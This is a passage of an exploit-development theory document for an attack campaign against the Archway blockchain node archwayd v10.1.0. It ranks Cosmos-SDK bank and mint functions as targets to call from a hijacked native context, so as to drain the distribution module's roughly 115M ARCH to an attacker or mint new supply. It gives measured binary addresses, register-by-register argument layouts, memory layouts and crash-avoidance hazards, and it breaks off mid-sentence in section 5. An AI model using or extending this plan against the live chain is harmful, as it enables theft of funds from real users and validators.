# Mint-path call candidates — theory for calling Cosmos-SDK money functions from a hijacked native context

**Campaign:** C2-09 / CWA-2026-006, M3 (E8) · **Target:** `archwayd` v10.1.0 (`archway-1`)
**Binary analysed:** `archwayd_linux_amd64` release asset, sha256
`cf9ae83316d7681cbf4f1dd3a65ef2a641678f4521c964226c5c70f9a1655901`, 105,198,520 B,
non-PIE `ET_EXEC`, entry `0x44f889`, statically linked, stripped, Go BuildID
`a8xqi8ibt8ASDIS621Dl/...` (CI run 37618225107; parsed with the in-repo `mint/e8/pclntab_dump`).
**Dependency versions (archway v10.1.0 `go.mod`):** cosmos-sdk `v0.50.10`, wasmd replaced by
`github.com/archway-network/archway-wasmd v0.50.2-archway` (ADR-036 line ~0.50/0.51),
cometbft `v0.38.17`, `cosmossdk.io/math v1.3.0`, `comsossdk.io/store v1.1.1`,
`cosmossdk.io/core v0.11.1`, Go `1.23.1`/toolchain `go1.23.5`.

**Status:** read-only theory document. No chain interaction. Confidence tags per claim:
`[HIGH]` = directly verified in pinned source or measured on the binary;
`[MED]` = derived by a short chain of sound reasoning, one step unverified;
`[LOW]` = plausible, needs the listed check; `[UNVERIFIED]` = not checked at all.

**Local evidence artifacts (addresses below come from these; not fabricated):**
- First E8 run (in repo): `archway/ci-artifacts/result-archway-mint/` (run `37616689073`) — function table,
  candidate lists, gadget catalog. Xref pass found 0 call sites (tool bug).
- Fixed E8 re-run (ephemeral, still in `/tmp/opencode/ci-watch-37618225107/artifact/ci-out/`):
  `e8_target_disasm.txt`, `e8_xrefs.txt` (13 targets with call sites), same addresses. If gone,
  re-download artifact from CI run `37618225107`.
- Gadgets file: `e8_gadgets.txt` (PIVOT-STRONG list quoted in §6.5).

---

## 0. TL;DR and candidate scoreboard

No function in this list is callable from *registers-only ROP with a couple of qwords*. Every usable
entry point needs (a) a **live Go heap object pointer** (the concrete keeper instance), (b) the
**`context.Context` itab + a live/crafted `sdk.Context`**, and (c) ~8–11 argument words loaded into
the Go ABI registers `RAX RBX RCX RDI RSI R8 R9 R10 R11` plus a few stack words. The ranking below is
by **how little else is needed once a leak of one keeper pointer exists**.

| Rank | Target (pointer-receiver variant) | Net effect | Why ranked here |
|---|---|---|---|
| **1** | `(*BaseKeeper).SendCoinsFromModuleToAccount` @ `0x1cb4500` | Moves **existing** coins from a rich module (`"distribution"`, 115.3M ARCH) straight to the attacker | One call; no permission check beyond module existence; creates the attacker's account if missing; no supply invariant change |
| **2** | `(*BaseSendKeeper).SendCoins` @ `0x1cadd00` (also `(*BaseKeeper).SendCoins` @ `0x1cb41e0`) | Same, from a **precomputed module address** (`sha256("distribution")[:20]`) | Fewer internal checks (no module-name lookup, **no blocked-address check on recipient**); needs sender bytes staged |
| **3** | `(*BaseKeeper).MintCoins` @ `0x1cb3720` | Mints new supply to the `"mint"` module account | The literal advisory capability; needs a 2nd call (`SendCoinsFromModuleToAccount("mint"→attacker)`) to extract; supply is updated consistently |
| **4** | `(*mintbankkeeper.Keeper).MintCoins` @ `0x2ae8a40` (+ `SendCoinsFromModuleToAccount` @ `0x2ae8b20`) | Identical to rank-3/1 | Archway's thin decorator; **adds no restrictions**; receiver is only 2 interface words (4 regs by value, or 1 pointer), so it is the cheapest *receiver* to stage if the mintbankkeeper instance is what leaks |
| **5** | `BaseSendKeeper.setBalance` @ `0x1c60220` | Credits an arbitrary address with one denom, directly | Leafiest state write (no account/supply logic, no events), but **no pointer wrapper exists** → the whole `BaseSendKeeper` must be copied onto the call stack (needs a copy primitive) |
| **6** | `BaseSendKeeper.addCoins` @ `0x1c5fe00` | Credit + `coin_received` event | Same receiver problem; reads old balance first |
| **7** | `x/mint.BeginBlocker` @ `0x23c89a0` | Normal block inflation → fee collector (not attacker) | Needs a `keeper.Keeper` value + `InflationCalculationFn`; heavyweight, not attacker-directed |
| **8** | `x/distribution.Keeper.FundCommunityPool` @ `0x21dfd6c`… | Moves *attacker → community pool* | Wrong direction; only useful to hide/launder |
| **9** | `bank msgServer.*` wrappers, `InputOutputCoins`, `BurnCoins` | — | Extra protobuf/address-decoding/callback staging for no gain |
| **10** | raw collections / KV writes (`collections.Map.Set`, `runtime.coreKVStore.Set`) | Direct state write | Bypasses keepers, but needs a store pointer **and** exact key encodings; only after arbitrary copy/read exists |

Assumption for ranks 1–4: E7/M2 produces at least one heap pointer to a keeper box (or to a
structure containing one; see §5.3 for the reachability paths). `[MED]`

---

## 1. Exact signatures (source-verified)

### 1.1 x/bank keeper — cosmos-sdk v0.50.10 (all *value* receivers)

Source: `github.com/cosmos/cosmos-sdk` tag `v0.50.10`, `x/bank/keeper/keeper.go`, `send.go`, `view.go`.
All keeper methods now take `context.Context` (not `sdk.Context`) and call `sdk.UnwrapSDKContext` internally. `[HIGH]`

```go
// x/bank/keeper/keeper.go
func (k BaseKeeper) MintCoins(ctx context.Context, moduleName string, amounts sdk.Coins) error
func (k BaseKeeper) BurnCoins(ctx context.Context, moduleName string, amounts sdk.Coins) error
func (k BaseKeeper) SendCoinsFromModuleToAccount(ctx context.Context, senderModule string, recipientAddr sdk.AccAddress, amt sdk.Coins) error
func (k BaseKeeper) SendCoinsFromModuleToModule(ctx context.Context, senderModule, recipientModule string, amt sdk.Coins) error
func (k BaseKeeper) SendCoinsFromAccountToModule(ctx context.Context, senderAddr sdk.AccAddress, recipientModule string, amt sdk.Coins) error
func (k BaseKeeper) DelegateCoins(ctx context.Context, delegatorAddr, moduleAccAddr sdk.AccAddress, amt sdk.Coins) error
func (k BaseKeeper) UndelegateCoins(ctx context.Context, moduleAccAddr, delegatorAddr sdk.AccAddress, amt sdk.Coins) error
func (k BaseKeeper) setSupply(ctx context.Context, coin sdk.Coin)        // unexported, no error return
func (k BaseKeeper) GetSupply(ctx context.Context, denom string) sdk.Coin

// x/bank/keeper/send.go
func (k BaseSendKeeper) SendCoins(ctx context.Context, fromAddr, toAddr sdk.AccAddress, amt sdk.Coins) error
func (k BaseSendKeeper) InputOutputCoins(ctx context.Context, input types.Input, outputs []types.Output) error
func (k BaseSendKeeper) addCoins(ctx context.Context, addr sdk.AccAddress, amt sdk.Coins) error   // unexported
func (k BaseSendKeeper) setBalance(ctx context.Context, addr sdk.AccAddress, balance sdk.Coin) error // unexported
func (k BaseSendKeeper) subUnlockedCoins(ctx context.Context, addr sdk.AccAddress, amt sdk.Coins) error

// x/bank/keeper/view.go
func (k BaseViewKeeper) GetBalance(ctx context.Context, addr sdk.AccAddress, denom string) sdk.Coin
func (k BaseViewKeeper) LockedCoins(ctx context.Context, addr sdk.AccAddress) sdk.Coins
```

Struct embedding (relevant for pointer aliasing): `type BaseKeeper struct { BaseSendKeeper; ak; cdc; storeService; mintCoinsRestrictionFn; logger }`,
`type BaseSendKeeper struct { BaseViewKeeper; cdc; ak; storeService; logger; blockedAddrs map[string]bool; authority string; sendRestriction *sendRestriction }`. `[HIGH]`
Because `BaseSendKeeper` is the **first field** of `BaseKeeper`, `*BaseKeeper` and `*BaseSendKeeper`
have the same address — a leaked pointer to one is a valid pointer for the other. `[HIGH]`

### 1.2 x/mint keeper — v0.50.10 (value receiver)

```go
// x/mint/keeper/keeper.go
func (k Keeper) MintCoins(ctx context.Context, newCoins sdk.Coins) error
    // implementation: if newCoins.Empty() { return nil }; return k.bankKeeper.MintCoins(ctx, types.ModuleName /* "mint" */, newCoins)
func (k Keeper) AddCollectedFees(ctx context.Context, fees sdk.Coins) error
    //   return k.bankKeeper.SendCoinsFromModuleToModule(ctx, "mint", k.feeCollectorName, fees)

// x/mint/abci.go
func BeginBlocker(ctx context.Context, k keeper.Keeper, ic types.InflationCalculationFn) error
    // ic: func(ctx context.Context, minter types.Minter, params types.Params, bondedRatio math.LegacyDec) math.LegacyDec
```
`[HIGH]` (signatures and bodies; note on Archway `k.bankKeeper` is the mintbankkeeper decorator, §5.1).

### 1.3 x/distribution keeper — v0.50.10 (value receiver)

```go
// x/distribution/keeper/keeper.go
func (k Keeper) FundCommunityPool(ctx context.Context, amount sdk.Coins, sender sdk.AccAddress) error
    // bankKeeper.SendCoinsFromAccountToModule(ctx, sender, "distribution", amount); then FeePool += DecCoins(amount)
```
`[HIGH]`. Direction is account→pool; not an extraction primitive by itself.

### 1.4 x/auth (needed by MintCoins)

```go
// x/auth/keeper/keeper.go
func (ak AccountKeeper) GetModuleAddress(moduleName string) sdk.AccAddress // pure map lookup on ak.permAddrs; NO ctx, no store
func (ak AccountKeeper) GetModuleAccount(ctx context.Context, moduleName string) sdk.ModuleAccountI
    // GetModuleAccountAndPermissions: addr=GetModuleAddress(name); acc=GetAccount(addr); if nil -> creates account & stores it
```
`[HIGH]`. `HasPermission` is a method on `sdk.ModuleAccountI` → interface dispatch. `[HIGH]`

### 1.5 Archway decorator — `x/rewards/mintbankkeeper` (v10.1.0)

Source: `archway-network/archway` tag `v10.1.0`, `x/rewards/mintbankkeeper/keeper.go`:

```go
type Keeper struct {
    bankKeeper    mintTypes.BankKeeper       // the real bank keeper (interface)
    rewardsKeeper RewardsKeeperExpected      // interface; NOT touched by MintCoins
}
func (k Keeper) MintCoins(ctx context.Context, name string, amt sdk.Coins) error {
    return k.bankKeeper.MintCoins(ctx, name, amt)                       // pure pass-through
}
func (k Keeper) SendCoinsFromModuleToAccount(ctx context.Context, senderModule string, recipientAddr sdk.AccAddress, amt sdk.Coins) error {
    return k.bankKeeper.SendCoinsFromModuleToAccount(ctx, senderModule, recipientAddr, amt) // pure pass-through
}
// only SendCoinsFromModuleToModule adds behaviour (reward split); not useful for extraction
```
`[HIGH]` — **it is thinner but not more permissive**: no extra auth, same downstream checks.
App wiring (`app/app.go`): `mintkeeper.NewKeeper(..., mintbankkeeper.NewKeeper(app.Keepers.BankKeeper, app.Keepers.RewardsKeeper), ...)`. `[HIGH]`
`maccPerms` on Archway: `minttypes.ModuleName: {authtypes.Minter}`; `distrtypes.ModuleName: nil`; `ibctransfertypes.ModuleName: {Minter,Burner}`. `[HIGH]`
No `WithMintCoinsRestriction` call exists in the Archway tree → the app's `BaseKeeper.mintCoinsRestrictionFn` is `types.NoOpMintingRestrictionFn`. `[MED]` (default-branch code search; not tag-diffed)
No `AppendSendRestriction` call exists in Archway or wasmd → `sendRestriction.fn == nil` at runtime. `[MED]`

### 1.6 Measured binary addresses (archwayd v10.1.0, sha256 above) `[HIGH]`

From the pclntab inventory (`e8_mint_candidates.txt` / `archwayd_functions.txt`); addresses are file
offsets of the entry PC of the named function. **Both value and pointer variants exist for the
exported methods** (Go emits pointer wrappers for the `*T` method-set); which variant is the body vs
the wrapper is a codegen fact that the current partial disassembly does not cleanly resolve — see §8 [UNVERIFIED roles].

```
1c58e60  x/bank/keeper.BaseKeeper.SendCoinsFromModuleToAccount
1c591a0  BaseKeeper.SendCoinsFromModuleToModule
1c594c0  BaseKeeper.SendCoinsFromAccountToModule
1c59cc0  BaseKeeper.MintCoins
1c5a480  BaseKeeper.BurnCoins
1c5dd60  BaseSendKeeper.InputOutputCoins
1c5ea20  BaseSendKeeper.SendCoins
1c5fe00  BaseSendKeeper.addCoins
1c60220  BaseSendKeeper.setBalance
1cac880  (*BaseSendKeeper).InputOutputCoins
1cadd00  (*BaseSendKeeper).SendCoins
1caf580  (*BaseKeeper).BurnCoins
1cb1f80  BaseKeeper.InputOutputCoins
1cb2120  (*BaseKeeper).InputOutputCoins
1cb3720  (*BaseKeeper).MintCoins
1cb4060  BaseKeeper.SendCoins
1cb41e0  (*BaseKeeper).SendCoins
1cb4380  (*BaseKeeper).SendCoinsFromAccountToModule
1cb4500  (*BaseKeeper).SendCoinsFromModuleToAccount
1cb4680  (*BaseKeeper).SendCoinsFromModuleToModule
21dfd80  x/distribution/keeper.Keeper.FundCommunityPool
21f6c60  (*distribution.Keeper).FundCommunityPool
2398e60  x/mint/keeper.Keeper.MintCoins
23a8900  (*mint.Keeper).MintCoins
23c89a0  x/mint.BeginBlocker
2ae8860  x/rewards/mintbankkeeper.Keeper.SendCoinsFromModuleToAccount
2ae8960  mintbankkeeper.Keeper.MintCoins
2ae8a40  (*mintbankkeeper.Keeper).MintCoins
2ae8b20  (*mintbankkeeper.Keeper).SendCoinsFromModuleToAccount
47cc80   runtime.morestack            47cd00 runtime.morestack_noctxt
458280/481560 runtime.newstack        479180/481580 runtime.morestackc
```

---

## 2. Memory layouts

### 2.1 `sdk.Context` (v0.50.10) — field list and size

Source: `types/context.go` at `v0.50.10`. Declaration order below **is** memory order (Go does not
reorder fields). `[HIGH]` for the list and pointer/interface classification.

| # | Field | Type | Kind | Size on amd64 `[MED]` |
|---|---|---|---|---|
| 1 | `baseCtx` | `context.Context` | iface (2 ptr) | 16 |
| 2 | `ms` | `storetypes.MultiStore` | **iface** | 16 |
| 3 | `header` | `cmtproto.Header` | value struct | 336 |
| 4 | `headerHash` | `[]byte` | slice | 24 |
| 5 | `chainID` | `string` | string | 16 |
| 6 | `txBytes` | `[]byte` | slice | 24 |
| 7 | `logger` | `log.Logger` | **iface** | 16 |
| 8 | `voteInfo` | `[]abci.VoteInfo` | slice | 24 |
| 9 | `gasMeter` | `storetypes.GasMeter` | **iface** | 16 |
| 10 | `blockGasMeter` | `storetypes.GasMeter` | **iface** | 16 |
| 11 | `checkTx` | `bool` | 1 | 1 |
| 12 | `recheckTx` | `bool` | 1 | 1 |
| 13 | `sigverifyTx` | `bool` | 1 | 1 |
| 14 | `execMode` | `ExecMode` (uint8) | 1 | 1 |
| 15 | `minGasPrice` | `DecCoins` (`[]DecCoin`) | slice | 24 |
| 16 | `consParams` | `cmtproto.ConsensusParams` | value struct | 72 |
| 17 | `eventManager` | `EventManagerI` | **iface** | 16 |
| 18 | `priority` | `int64` | 8 | 8 |
| 19 | `kvGasConfig` | `storetypes.GasConfig` | 7×uint64 | 56 |
| 20 | `transientKVGasConfig` | `storetypes.GasConfig` | 7×uint64 | 56 |
| 21 | `streamingManager` | `storetypes.StreamingManager` | **iface** | 16 |
| 22 | `cometInfo` | `comet.BlockInfo` | **iface** | 16 |
| 23 | `headerInfo` | `header.Info` `{Height int64; Hash []byte; Time time.Time; ChainID string; AppHash []byte}` | value struct | 96 |

**Estimated `sizeof(sdk.Context) ≈ 872 bytes` `[MED]`** (sum of the above; sub-sizes: `time.Time`=24,
`cmtproto.Header`=336 computed from the cometbft v0.38 proto field list, `ConsensusParams`=72,
`GasConfig`=56, `header.Info`=96). Exact value and offsets should be produced on CI with a mirror
struct program pinned to the same modules (§8, task V2); mark offsets [UNVERIFIED].

Methods are **value receivers**; `Context` satisfies `context.Context` directly
(`var _ context.Context = Context{}`). Therefore an `sdk.Context` passed as `ctx context.Context`
is an **indirect interface**: `{itab=&go:itab.Context,context.Context, data=*Context}`, where data
points at a boxed 872-byte copy. `[HIGH]` (mechanism), itab address = static data address in the
binary, findable by disassembly (E8b). `[MED]`

Fields actually dereferenced by the candidate calls:
- `UnwrapSDKContext(ctx)`: **only the itab matters** — it is `ctx.(Context)`, a type assertion. `[HIGH]`
- `Context.KVStore(key)` (reached through every controller of the store): `ms.GetKVStore(key)` (iface
  call), `gaskv.NewStore(..., c.gasMeter, c.kvGasConfig)` → **`ms`, `gasMeter`, `kvGasConfig` must be valid**. `[HIGH]`
- events: `eventManager` iface → `EmitEvent`/`EmitEvents`. `[HIGH]`
- `LockedCoins` → `k.ak.GetAccount` (keeper field) → if a vesting account, `sdkCtx.BlockTime()` (header). Module accounts are not vesting. `[HIGH]`
- `logger`, `baseCtx`, `headerHash`, `voteInfo`, `blockGasMeter`, `consParams`, `streamingManager`,
  `cometInfo`, `headerInfo`, `checkTx`, `minGasPrice`, `priority`: **not touched** by the top-4 calls. `[MED]` (source trace)

### 2.2 Coins / Coin / math.Int / AccAddress

```go
type Coin struct { Denom string; Amount math.Int }   // field order verified in binary type descriptors
type Coins []Coin                                    // 24-byte slice header
type AccAddress []byte                               // 24-byte slice header
type string                                          // 16-byte (ptr,len)
```
`[HIGH]` (source + binary type shapes in `e8_ctx.txt`, e.g. the sharded `CollectionPaginate[...]`
signature spells out `struct { Denom string; Amount cosmossdk.io/math.Int }` and
`cosmossdk.io/math.i *math/big.Int`).

`math.Int` (`cosmossdk.io/math v1.3.0`) is a one-field wrapper:
```go
type Int struct { i *big.Int }
```
and `big.Int = struct { neg bool; abs []Word }` (Word = uint64) → `sizeof(big.Int)` = 8 (bool+pad) + 24 (slice) = 32; `Int` itself is **one 8-byte pointer**. `[HIGH]` per `math/int.go` + binary.
Nil `Int.i` is treated as zero by `BigInt()`; but `Coin.Validate()` rejects a nil Amount
("amount is nil"). `[HIGH]`

To stage one valid `Coin` for `"aarch"` and amount A:
- `Denom` → 5 bytes `"aarch"` somewhere readable; `Amount` → pointer to `big.Int{neg=0, abs={ptr,len,cap}}`;
- `abs` limb array is **little-endian** (`nat[0]` least significant); a 10^26 aarch (100M ARCH) needs
  **2 limbs**; prefer `len=cap=2`. `[HIGH]`

Denom on Archway: `"aarch"` (bond denom and native denom; e.g. `/cosmos/bank/v1beta1/supply` = `{"denom":"aarch",...}`). `[HIGH]` (local `analysis/supply.json`)
Module address: `authtypes.NewModuleAddress(name)` = `sha256(name)[:20]` (bech32-encoded with the
app prefix). `[MED]` (SDK helper; not tag-diffed)

`Coin.Validate()` / `Coins.Validate()` rules: denom regex `^[a-zA-Z][a-zA-Z0-9/:._-]{2,127}$`,
amount non-nil non-negative; single-element `Coins` must be positive for `Coins.IsValid()`; `MintCoins`
and `addCoins` only consult `amt.IsValid()` (non-negative allowed!). `[HIGH]` (`types/coin.go`).

### 2.3 Keeper structs — what "reuse the real one" saves

`BaseKeeper` (value) includes: `BaseSendKeeper{ BaseViewKeeper{ cdc iface; storeService iface; ak
iface; logger iface; Schema; Supply Map; DenomMetadata Map; SendEnabled Map; Balances *IndexedMap;
Params Item }, cdc, ak, storeService, logger, blockedAddrs map, authority string, sendRestriction *… }`,
plus `ak`, `cdc`, `storeService`, `mintCoinsRestrictionFn func`, `logger`. `[HIGH]`
Fabricating this from scratch is not realistic from qwords: it embeds **three itab/data pairs**
(`cdc`, `ak`, `storeService`), several **function-value closures** (`collections.Map.sa`, the value
codecs, schema), maps and indexes. → Always reuse the app's real instance via a leaked pointer. `[HIGH]` (design conclusion)

`mintbankkeeper.Keeper` is only `{ bankKeeper iface; rewardsKeeper iface }` (32 B), and `MintCoins`
does not read `rewardsKeeper`. Its value-receiver call needs 4 register words; its pointer wrapper
needs **one** pointer. `[HIGH]` (source) — this is the cheapest receiver in the whole path.

### 2.4 Go ABI argument mapping for the ranked targets

Go internal ABI (AMD64): int args in `RAX,RBX,RCX,RDI,RSI,R8,R9,R10,R11` (9 regs); `R14`=g;
each argument is **entirely** register- or stack-assigned; if it cannot fully fit, the register
cursor is *reset* and the argument goes to the stack (subsequent args restart at RAX). A call
expects `[RSP] = return PC`, stack args at `RSP+8, +16, …`; the caller also reserves uninitialized
spill space. Source: Go internal ABI spec (`src/cmd/compile/abi-internal.md`, go1.23.5). `[HIGH]`

Layouts below assume the **pointer-wrapper variant** of each method (receiver = 1 word) — the
identities/roles need E8b confirmation [§8 V1] — and are otherwise a mechanical consequence of the
ABI spec. `[MED]` (layout given wrapper) / `[UNVERIFIED]` (wrapper role).

| Target | RAX | RBX | RCX | RDI | RSI | R8 | R9 | R10 | R11 | stack (+8…) |
|---|---|---|---|---|---|---|---|---|---|---|
| `(*BaseKeeper).MintCoins(ctx,name,amt)` | *BaseKeeper | ctx.itab | ctx.data | name.ptr | name.len | amt.ptr | amt.len | amt.cap | – | – |
| `(*BaseKeeper).SendCoinsFromModuleToAccount(ctx,name,addr,amt)` | *BaseKeeper | ctx.itab | ctx.data | name.ptr | name.len | addr.ptr | addr.len | addr.cap | amt goes wholly to stack | amt.ptr, amt.len, amt.cap |
| `(*BaseSendKeeper).SendCoins(ctx,from,to,amt)` | *BaseSendKeeper | ctx.itab | ctx.data | from.ptr | from.len | from.cap | to.ptr | to.len | to.cap | amt.ptr, amt.len, amt.cap |
| value body `BaseKeeper.MintCoins` | ctx.itab | ctx.data | name.ptr | name.len | amt.ptr | amt.len | amt.cap | – | – | receiver BaseKeeper **by value** at [RSP+8…] |
| value body `SendCoinsFromModuleToAccount` | ctx.itab | ctx.data | name.ptr | name.len | addr.ptr | addr.len | addr.cap | – | – | amt 3 words, receiver by value |

The value-body rows make the point of rank 1–4: **pointer wrappers avoid staging the huge receiver**;
value bodies require a full `BaseKeeper`/`BaseSendKeeper` image in the outgoing argument frame. `[HIGH]`

---

## 3. Internal call chains and state touchpoints

### 3.1 `BaseKeeper.MintCoins(ctx, moduleName, amounts)` — source trace `[HIGH]`

1. `sdkCtx := sdk.UnwrapSDKContext(ctx)` — type assertion only.
2. `k.mintCoinsRestrictionFn(ctx, amounts)` — **func-value indirect call** (app default = NoOp).
3. `acc := k.ak.GetModuleAccount(ctx, moduleName)` — **interface call** (`AccountKeeper`); reads/creates auth account state; sees `permAddrs` map.
4. `acc.HasPermission(authtypes.Minter)` — **interface call** on `ModuleAccountI`; `panic` if missing.
5. `acc.GetAddress()` — **interface call**.
6. `k.addCoins(ctx, acc.GetAddress(), amounts)`:
   - `amt.IsValid`; per coin: `k.GetBalance` → `k.Balances.Get` (`collections.IndexedMap`) →
     `m.sa(ctx)` (**func value**) → `runtime.kvStoreService.OpenKVStore` → `ctx.KVStore(bankKey)` →
     `c.ms.GetKVStore(key)` (**interface call**, MultiStore) → `gaskv.NewStore`; `store.Get` (**interface call**, KVStore);
   - `k.setBalance(ctx, addr, newBalance)` → `k.Balances.Set(...)` → `sa` + `store.Get/Set` and the
     `address_by_denom` reverse index maintenance (**more `store` interface calls**);
   - `EventManager().EmitEvent(NewCoinReceivedEvent)` — **interface call**.
7. per coin: `k.GetSupply` → `k.Supply.Get` → `sa` + `store.Get` (**interface calls**);
   `k.setSupply` → `k.Supply.Set/Remove` → `sa` + `store.Set/Delete` (**interface calls**).
8. `k.logger.Debug(...)` — **interface call** (only when it runs; allocates the amounts string).
9. `EventManager().EmitEvent(NewCoinMintEvent)` — **interface call**.

State written: bank `balances/<addr>/<denom>` (+ index), bank `supply/<denom>`, possibly auth
`accounts` (+ `account_number`) via GetModuleAccount creation (only if missing), events (memory).
State read: auth account, bank balance, bank supply.

### 3.2 `BaseKeeper.SendCoinsFromModuleToAccount` — `[HIGH]`

1. `senderAddr := k.ak.GetModuleAddress(senderModule)` — **interface call**, but pure map lookup (`permAddrs`), no store; `panic` if unknown module.
2. `k.BlockedAddr(recipientAddr)` — `k.blockedAddrs[addr.String()]`; `addr.String()` bech32-encodes (global SDK config).
3. `k.SendCoins(ctx, senderAddr, recipientAddr, amt)`:
   - `subUnlockedCoins`: `amt.IsValid`; `k.LockedCoins` → `k.ak.GetAccount` (**interface call**; module account → not vesting → empty locked); per coin `GetBalance` + `setBalance`;
   - `k.sendRestriction.apply` — **func-value call**, nil on this deployment [§1.5];
   - `addCoins(toAddr)` — `GetBalance` + `setBalance` (+ no event here);
   - `k.ak.HasAccount` (**iface**); if missing: `defer telemetry.IncrCounter` (defer on our frame!) + `k.ak.NewAccountWithAddress` (**iface**) + `k.ak.SetAccount` (**iface**);
   - `sdkCtx.EventManager().EmitEvents(...)` — **interface call** (2 events).

### 3.3 `BaseSendKeeper.SendCoins` — `[HIGH]`
As 3.2 without steps 1–2 (no module lookup, no blocked-address validation). The sender address
itself must have balance (use the precomputed module address).

### 3.4 `setBalance` / `addCoins` — `[HIGH]`
`setBalance` (no account lookup, no events, no supply): validates `Coin`, then `Balances.Set` (or
`.Remove` for zero) → `sa(ctx)` + `store.Set/Delete` + index maintenance. **It needs no
`storeKey` argument; the key is baked into the keeper's `storeService` closure. It needs a valid ctx
(`ms`, `gasMeter`, `kvGasConfig`).** `addCoins` = `GetBalance` + `setBalance` + `coin_received` event.
Leafiness ranking inside the bank keeper: `setBalance` < `addCoins` < `SendCoins` ≈
`SendCoinsFromModuleToAccount` < `MintCoins` (in terms of distinct state systems touched).

### 3.5 Interface-vs-direct summary `[HIGH]`

| Call | Kind | Needs |
|---|---|---|
| `UnwrapSDKContext` | type assertion | **correct itab address** only |
| `k.ak.{GetModuleAccount,GetAccount,HasAccount,SetAccount,NewAccountWithAddress,GetModuleAddress}` | itab dispatch | receiver's `ak` iface (itab+data) |
| `acc.HasPermission/GetAddress` | itab dispatch on `ModuleAccountI` | return value of GetModuleAccount |
| `k.mintCoinsRestrictionFn`, `k.sendRestriction.fn`, `collections.Map.sa` | **func value** (closure ptr + code ptr) | receiver field/codec |
| `store.Get/Set/Delete/Has` | itab dispatch (KVStore) | ctx `ms` + key (inside service closure) |
| `ctx.EventManager().EmitEvent(s)` | itab dispatch (EventManagerI) | ctx `eventManager` field |
| `k.logger.Debug` | itab dispatch (log.Logger) | receiver `logger` field |
| all internal keeper helpers (`addCoins`, `setBalance`, `subUnlockedCoins`, `GetSupply`, `setSupply`, `GetBalance`, `LockedCoins`) | direct calls | — |
| `collections` map machinery | direct methods + func-value `sa` | map struct copied with receiver |

The xref scan over 14.7M disassembly lines found **zero direct `call` sites to the bank keeper
methods** — they are only reached through itabs (13 hits were only tiny wrappers/serializers).
`[HIGH]` (artifact `e8_xrefs.txt`, fixed run)

---

## 4. Known hazards when entering Go code from the Wasmer fiber stack

Evidence: Go internal ABI spec; the measured prologue pattern in `e8_target_disasm.txt`; E1–E5 lab
results; runtime symbols in `e8_runtime.txt`.

1. **Stack-split prologue** `[HIGH pattern / MED behavior]`. Every non-leaf Go function begins with
   `lea -framesize(%rsp),%r12; cmp 0x10(%r14),%r12; jbe <grow>` (observed e.g. `0x2ae89a0`:
   `lea -0x20(%rsp),%r12; cmp 0x10(%r14),%r12; jbe 0x2ae8a74`, where the target calls the
   unresolved stack-growth thunk `0x4cb6a0`). `0x10(%r14)` is `g.stackguard0`. On this deployment
   the fiber stacks are mmap'd (~`0x7f…`) and goroutine stacks are heap arenas (~`0xc0…`), so a
   fresh Go frame on a fiber is *above* `stackguard0` and the check passes — but this must be
   confirmed experimentally. **The fiber guard page is not `g.stackguard0`**: Go will not protect
   the 1 MiB fiber bottom. Budget: measured frames are large (`SendCoins` `0x388` = 904 B;
   `SendCoinsFromModuleToAccount` ≈ 0x7e0; `addCoins` `0xa58` = 2,648 B — plus the whole downstream
   chain). Stage RSP so ≥ 64 KiB (prefer ≥ 256 KiB) of writable fiber stack lies below it. `[MED]`
2. **`g` = R14 required everywhere** `[HIGH requirement / UNVERIFIED at hijack]`. R14 must point at
   the current goroutine (valid during the cgo session; Rust callee-saved-preserves it). If R14 is
   wrong, prologues, write barriers, allocation and GC crash or corrupt. Empirical check =
   instrumented harness (E9 pre-flight): read R14 at the pivot and compare with a known g pool pattern.
3. **Return-slot convention for a JMP entry** `[HIGH]`. A Go callee assumes a normal `CALL`: `[RSP]`
   must hold a *return PC*, and stack args live at `[RSP+8…]`. If the first-stage chain `jmp`s to the
   target, it must first place a **landing address** in the fake return slot; this doubles as the
   continuation of the chain after the mint returns.
4. **Write barriers** `[HIGH observed / MED impact]`. Generated code gates pointer stores on
   `runtime.writeBarrier` (observed as `cmpl $0x0,0x68a7410` … `call 0x4cd5a0`; 0x4cd5a0 = inferred
   `gcWriteBarrier`). If a GC mark is in progress, these run **on our stack** using g/m — works if
   (2) holds. Our own staged stores go to stack memory and do not need barriers.
5. **Allocation/GC** `[MED]`. Calls such as `0x4c7020`/`0x4c7100` (newobject/mallocgc area) can
   trigger a GC. GC scans real goroutine stacks, **not our fiber frames**; objects referenced only
   from our frames are invisible to the GC (short window; avoid triggering GC, avoid big allocs).
6. **Async preemption / signals** `[UNVERIFIED]`. `SIGURG` async preemption poisons `stackguard0`
   with `stackPreempt`; the next prologue would take `morestack` and may park the goroutine
   mid-chain. Keep the chain short and allocation-light; test with GC on.
7. **Panics** `[MED]`. A panic inside `MintCoins` (unknown module / missing permission) or any nil
   deref unwinds through `g._defer`; our frames have no recover, and the outer frames belong to the
   cgo/wasm callback — treat a panic as node-fatal. Choose arguments that cannot panic
   (existing module, sufficient balance, valid Coins).
8. **Deferred calls** `[MED]`. `SendCoins` registers `defer telemetry.IncrCounter` when it creates
   the recipient account; the defer bookkeeping runs on return and uses `g` — fine if (2) holds,
   but it is extra runtime interaction.
9. **Crash containment** `[MED]` (E4/E5 observation). Faults on the fiber stack surface through
   Wasmer's handlers as traps (`call stack exhausted`, `SIGSEGV` logged with `fault_addr`) and can
   be recovered at the wasm boundary — but nothing guarantees this.
10. **Commit requirement** `[HIGH]`. Writes through a `ctx` whose `ms` is the tx `cachemulti`
    store land in the **tx cache**; they commit only if the enclosing tx completes successfully.
    The post-call landing must return control so wasmd/baseapp finishes normally. A fallback is to
    point `ms` at the app's root commit store (bypassing the cache; writes survive even if the tx
    fails); that requires a different (harder) leak.

---

## 5. Archway specifics

1. **`mintbankkeeper`** — verified pass-through for `MintCoins`/`SendCoinsFromModuleToAccount`; only
   `SendCoinsFromModuleToModule` is decorated (reward split). It does **not** restrict module names
   or amounts. Its design value as a call target is the **small receiver**: value = 4 register
   words, pointer-wrapper = 1. `[HIGH]`
2. **App wiring** — the mintbankkeeper instance is boxed by the interface conversion in
   `mintkeeper.NewKeeper(..., mintbankkeeper.NewKeeper(...))`; reachable from the mint keeper's
   `bankKeeper` field (data word of `mintTypes.BankKeeper`). The plain `BaseKeeper` box is pointed
   to by `ArchwayApp.Keepers.BankKeeper` and by every `bankKeeper`/`bank` interface field in
   wasmd/distribution/rewards keepers. `[MED]` (wiring evidence [HIGH]; exact layout [MED])
3. **Where a live `sdk.Context` and keeper pointers can coexist with the hijack** `[MED]`: during
   contract execution wasmd builds `querier := k.newQueryHandler(sdkCtx, contractAddress)` and
   passes it into `k.wasmVM.Execute(codeHash, env, info, msg, prefixStore, cosmwasmAPI, querier,
